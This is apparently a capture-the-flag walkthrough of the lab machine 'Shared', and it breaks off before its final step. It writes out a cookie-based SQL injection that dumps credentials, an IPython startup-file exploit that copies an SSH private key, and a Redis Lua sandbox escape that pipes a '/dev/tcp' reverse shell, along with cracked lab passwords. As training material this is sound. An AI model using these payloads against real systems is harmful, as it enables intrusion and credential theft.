2007 James Fisher"                                                                                                                                            000000013:   302        0 L      0 W        0 Ch        "#"                                                                                                                                                                        000000012:   302        0 L      0 W        0 Ch        "# on at least 2 different hosts"                                                                                                                                          000000011:   302        0 L      0 W        0 Ch        "# Priority ordered case-sensitive list, where entries were found"                                                                                                         000000015:   200        1494 L   2312 W     56208 Ch    "index"                                                                                                                                                                    000000010:   302        0 L      0 W        0 Ch        "#"                                                                                                                                                                        000000009:   302        0 L      0 W        0 Ch        "# Suite 300, San Francisco, California, 94105, USA."                                                                                                                      000000006:   302        0 L      0 W        0 Ch        "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                                            000000005:   302        0 L      0 W        0 Ch        "# This work is licensed under the Creative Commons"                                                                                                                       000000008:   302        0 L      0 W        0 Ch        "# or send a letter to Creative Commons, 171 Second Street,"                                                                                                               000000002:   302        0 L      0 W        0 Ch        "#"                                                                                                                                                                        000000004:   302        0 L      0 W        0 Ch        "#"                                                                                                                                                                        000000039:   403        7 L      9 W        153 Ch      "img"                                                                                                                                                                      000000164:   403        7 L      9 W        153 Ch      "uploads"                                                                                                                                                                  000000366:   403        7 L      9 W        153 Ch      "upload"                                                                                                                                                                   000000621:   403        7 L      9 W        153 Ch      "imgs"000001026:   401        0 L      2 W        16 Ch       "api"

The only endpoint that looks interesting is the api one.
But unfortunately if we try to access it we will be prompted with a login page.

After some manual enumeration we can see that we can add items to a cart.

Adding it to cart we can see that we are being redirected to a new location https://checkout.shared.htb/
So let’s add this too in our /etc/hosts file.

Because we saw that we have one more vhost we will try a subdomain enumeration in case there is another subdomain that we need to find.

-> wfuzz subdomain enumeration:

└─$ wfuzz -u https://shared.htb/ -w httparchive_subdomains_2020_11_18.txt -H 'Host: FUZZ.shared.htb' --hw 11********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: https://shared.htb/Total requests: 1537976=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    =====================================================================000000001:   302        0 L      0 W        0 Ch        "www"                                                                                                                                                                      000000613:   200        64 L     151 W      3229 Ch     "checkout"

Now we can positively say that there are no more subdomains.
This wordlist is from https://wordlists.assetnote.io/

Normally if you are being redirected to a checkout page there would be some sort of payment method that you need to use in order to buy the item(s) you want.

If we take a closed look on the button we can see that it’s not doing any sort of post / get request.
So there must be something else that we can abuse.
Looking at the cookies we ecan see a strange “hash”

By using CyberChef we can see that it’s just a string URL Encoded
By decoding this we can see the content: {"YCS98E4A":"1"}

Remember, this server uses PHP so we will try a SQL Injection in the cookie keeping the format we just decoded.
By trying to find the number of rows we can see that we get a successful hit on the 3rd row.

Payload:

{"1' union select 1,2,3-- -":"1"}

Now with that information in mind we can try to dump every piece of data we can in order to elevate our privilages.
We will dump the database name first so we can enumerate it.

{"1' union select 1,database(),3-- -":"1"}

Now we will need to dump the table_name & table_schema:

{"1' union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"}

Now let’s dump the user’s username & password:

{"1' union select 1,username,2 from checkout.user-- -":"1"}{"1' union select 1,password,2 from checkout.user-- -":"1"}

The user is james_mason and password is fc895d4eddc2fc12f995e18c865cf273
Using hash-identifier against it we can see that it’s most probably to be an MD5 string.

└─$ hash-identifier   #########################################################################   #     __  __                     __           ______    _____           #   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #   #                                                             By Zion3R #   #                                                    www.Blackploit.com #   #                                                   Root@Blackploit.com #   #########################################################################-------------------------------------------------- HASH: fc895d4eddc2fc12f995e18c865cf273Possible Hashs:[+] MD5[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

So we will put this on https://crackstation.net/ to quickly crack the password.

PASSWORD: Soleil101

Now with these credentials we can log in into SSH

james_mason@shared:~$ hostnamesharedjames_mason@shared:~$ iduid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)james_mason@shared:~$ whoamijames_mason

We can see that we are in a group called developer so let’s investigate it.

james_mason@shared:~$ find / -group developer 2>/dev/null/opt/scripts_review

We can see that we have access to /opt/scripts_review but the folder is empty.
So there must be a crontab or something of this sort running.
The system in running Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux so we will download the x64 bit version of pspy
In this case we will use pspy:

2022/10/25 15:50:01 CMD: UID=1001 PID=18642  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 2022/10/25 15:50:01 CMD: UID=1001 PID=18643  | /usr/bin/pkill ipython 2022/10/25 15:50:01 CMD: UID=1001 PID=18644  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 2022/10/25 15:50:06 CMD: UID=0    PID=18649  | perl -ne s/\((\d+)\)/print " $1"/ge 2022/10/25 15:50:06 CMD: UID=0    PID=18648  | /bin/bash /root/c.sh 2022/10/25 15:50:06 CMD: UID=0    PID=18647  | /bin/bash /root/c.sh

Using this blog we can easily escalate the privilages: https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x

mkdir -m 777 profile_defaultmkdir -m 777 profile_default/startupecho "import os; os.system('cat ~/.ssh/id_rsa > /dev/shm/key')" > profile_default/startup/foo.pyjames_mason@shared:/opt/scripts_review$ cat /dev/shm/key -----BEGIN OPENSSH PRIVATE KEY----------END OPENSSH PRIVATE KEY-----

With this id_rsa key we can log in as dan_smith and try to privilege escalate to root

└─$ ssh -i id_rsa dan_smith@10.10.11.172Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Oct 25 15:47:24 2022 from 10.10.14.139dan_smith@shared:~$

Privilege Escalation

Information Gathering ( Operating System )

dan_smith@shared:~$ cat /etc/*-releasePRETTY_NAME="Debian GNU/Linux 11 (bullseye)"NAME="Debian GNU/Linux"VERSION_ID="11"VERSION="11 (bullseye)"VERSION_CODENAME=bullseyeID=debianHOME_URL="https://www.debian.org/"SUPPORT_URL="https://www.debian.org/support"BUG_REPORT_URL="https://bugs.debian.org/"

User Information Gathering

dan_smith@shared:~$ iduid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)dan_smith@shared:~$ groupsdan_smith developer sysadmindan_smith@shared:~$ find / -group sysadmin 2>/dev/null/usr/local/bin/redis_connector_devdan_smith@shared:~$

We can see again that we are in a strange group called sysadmin.
So let’s investigate the redis_connector_dev:

dan_smith@shared:/usr/local/bin$ file redis_connector_devredis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped

We can see that this is a binary so let’s execute it:

dan_smith@shared:/usr/local/bin$ /usr/local/bin/redis_connector_dev[+] Logging to redis instance using password...INFO command result:# Serverredis_version:6.0.15redis_git_sha1:00000000redis_git_dirty:0redis_build_id:4610f4c3acf7fb25redis_mode:standaloneos:Linux 5.10.0-16-amd64 x86_64arch_bits:64multiplexing_api:epollatomicvar_api:atomic-builtingcc_version:10.2.1process_id:18862run_id:03664ffbd5a89dea04f6577dc3ba064b617ce42atcp_port:6379uptime_in_seconds:30uptime_in_days:0hz:10configured_hz:10lru_clock:5783472executable:/usr/bin/redis-serverconfig_file:/etc/redis/redis.confio_threads_active:0<nil>

We can see the port that it’s listening on.
So after some research I found out that we could do a sandbox escape according to: https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/
So basically what we need to do is to connect via redis-cli and do a “sandbox command injection”.
But in order to do that we need a password for the redis-cli
So we will download the binary to our machine and try to find it.

Now that we found the password we can continue with the sandbox escape

echo "bash -i >& /dev/tcp/IP/443 0>&1" > /dev/shm/shredis-cli --pass F2WHqJUz2WEz=Gqq127.0.0.1:6379> eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /dev/shm/sh | bash"); local res = f:read("*a"); f:close(); return res' 0

Now we just need to setup a listener and wait for the reverse shell to pop:
